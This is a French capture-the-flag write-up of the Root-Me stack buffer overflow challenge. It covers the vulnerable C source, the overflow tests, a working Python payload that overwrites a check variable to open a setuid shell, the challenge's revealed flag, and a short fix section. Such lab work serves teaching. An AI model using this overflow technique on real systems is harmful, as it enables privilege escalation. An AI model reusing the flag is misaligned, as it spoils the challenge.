# L’épopée Root-Me : App - Système | ELF x86 - Stack buffer overflow basic 1

## 1. Informations Générales & Configuration de l'Environnement

| Protection | Nom complet | État |
| :--- | :--- | :---: |
| **PIE** | Position Independent Executable | ❌ |
| **RelRO** | Read Only relocations | ❌ |
| **NX** | Pile non exécutable | ❌ |
| **Heap exec** | Tas non exécutable | ❌ |
| **ASLR** | Distribution aléatoire de l'espace d'adressage | ❌ |
| **SF** | Source Fortification | ❌ |
| **SRC** | Accès au code source | ✔️ |

---

## 2. Analyse du Code Source

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
  {
    printf("Hell yeah! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    printf("Shell closed! Bye.\n");
  }

  return 0;
}
```

### Le challenge :
La première étape de ce challenge va être la lecture du code. Ici du C, voici les informations notables :
- Une adresse hexadécimal dans une variable “check”
- Un tableau de 40 éléments
- Un fgets lisant le tableau, et prenant 45 caractères maximum
- Une condition vérifiant si l'adresse correspond à `0xdeadbeef`, condition de la victoire. Si c’est le cas, on aura accès à un shell root.

Une première faille semble me sauter aux yeux, la taille du buffer est plus petite que ce que fgets accepte. *(Précision technique sur la pile/Stack Layout : la variable `check` étant allouée à proximité de `buf` sur la pile x86, les 5 caractères supplémentaires permettent de déborder directement sur l'espace mémoire réservé à `check`)*.

---

## 3. Exploitation & Démarche de Resolution

### Étape 1 : Déroulement basique du script
Tout d’abord on va vérifier le déroulement basique du script :

```bash
app-systeme-ch13@challenge02:~$ ./ch13
Hello World!

[buf]: Hello World!
[check] 0x4030201
```

On voit qu’on a bien l’adresse `0x4030201` comme ce que le programme a prévu.

### Étape 2 : Test du débordement mémoire
Essayons maintenant d’écrire une chaîne de 42 caractères. Plus que la capacité du buffer mais toujours accepté par fgets.

```bash
app-systeme-ch13@challenge02:~$ ./ch13
IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII

[buf]: IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
[check] 0xa4949

You are on the right way!
```

On voit que cette fois, l’adresse a changé, on va essayer d’en avoir une différente.

```bash
app-systeme-ch13@challenge02:~$ ./ch13
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0xa4141

You are on the right way!
```

Avec le même nombre de caractères mais en changeant le caractère, on a une adresse différente.

### Étape 3 : Identification de l'Endianness
Une chose qui m’a interpellé, c’est que `0xa4949` et `0xa4141`, `0x49` étant le code ASCII de “I” et `0x41` celui de “A”, donc en choisissant d’autres caractères on pourrait influer sur la bonne adresse. On va d’abord tester où se place le nouveau caractère quand on déborde de la zone mémoire :

```bash
app-systeme-ch13@challenge02:~$ ./ch13
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI
[check] 0xa494141
```

On voit qu’il s’ajoute au début de l’adresse, c’est donc du little endian *(l'architecture x86 enregistrant les octets de poids faible aux adresses mémoire inférieures)*, le but va être d’ajouter dans l’ordre : `0xEF 0xBE 0xAD 0xDE`.

### Étape 4 : Injection du payload
Deux choix s’offrent à nous, trouver les bons caractères, ou bien simplement injecter les octets voulus grâce à du code, ce qu’on va faire.

```bash
python3 -c "import sys; sys.stdout.buffer.write(40*b'A' + b'\xef\xbe\xad\xde')" | ./ch13
```

Le code est simple, il va envoyer grâce à un pipe 40 fois l’octet correspondant au code ASCII de ‘A’, et ensuite les 4 octets que nous voulons injecter.

```bash
app-systeme-ch13@challenge02:~$ python3 -c "import sys; sys.stdout.buffer.write(40*b'A' + b'\xef\xbe\xad\xde')" | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0xdeadbeef
Hell yeah! You win!
Opening your shell...
Shell closed! Bye.
```

Ca a fonctionné, mais le shell n’est pas utilisable, il se ferme instantanément pour l’instant *(car le flux stdin est fermé à la fin du script Python)*.

### Étape 5 : Maintien du shell interactif
En modifiant légèrement le code, en utilisant cat, Linux va attendre une entrée *(en maintenant le descripteur d'entrée standard stdin ouvert)*, et ça permettra de garder le shell ouvert.

```bash
(python3 -c "import sys; sys.stdout.buffer.write(40*b'A' + b'\xef\xbe\xad\xde')"; cat) | ./ch13
```

```bash
app-systeme-ch13@challenge02:~$ (python3 -c "import sys; sys.stdout.buffer.write(40*b'A' + b'\xef\xbe\xad\xde')"; cat) | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0xdeadbeef
Hell yeah! You win!
Opening your shell...
ls
ch13  ch13.c  Makefile
^CShell closed! Bye.

ls -la
total 36
dr-xr-x---  2 app-systeme-ch13-cracked app-systeme-ch13 4096 déc.  19 2025 .
drwxr-xr-x 18 root                     root             4096 déc.  10 2021 ..
-r-sr-x---  1 app-systeme-ch13-cracked app-systeme-ch13 7360 déc.  19 2025 ch13
-r--r-----  1 app-systeme-ch13-cracked app-systeme-ch13  556 déc.  19 2025 ch13.c
-rw-r-----  1 root                     root               44 déc.  10 2021 .git
-r--r-----  1 app-systeme-ch13-cracked app-systeme-ch13  537 déc.  10 2021 Makefile
-r--------  1 app-systeme-ch13-cracked app-systeme-ch13   17 déc.  10 2021 .passwd
-r--------  1 root                     root              791 déc.  10 2021 ._perms

cat .passwd
1w4ntm0r3pronp1s
```

On vérifie le mot de passe.

On remporte bien les points.

---

## 4. Comment se protéger ?

Ici, l’erreur venait d’une coquille dans le code. Le fgets acceptait plus que ce que le buffer pouvait stocker. Donc la mémoire déborde et elle devient manipulable. Simplement baisser la taille accepté par le fgets ou augmenter la taille du buffer règlerait le problème.
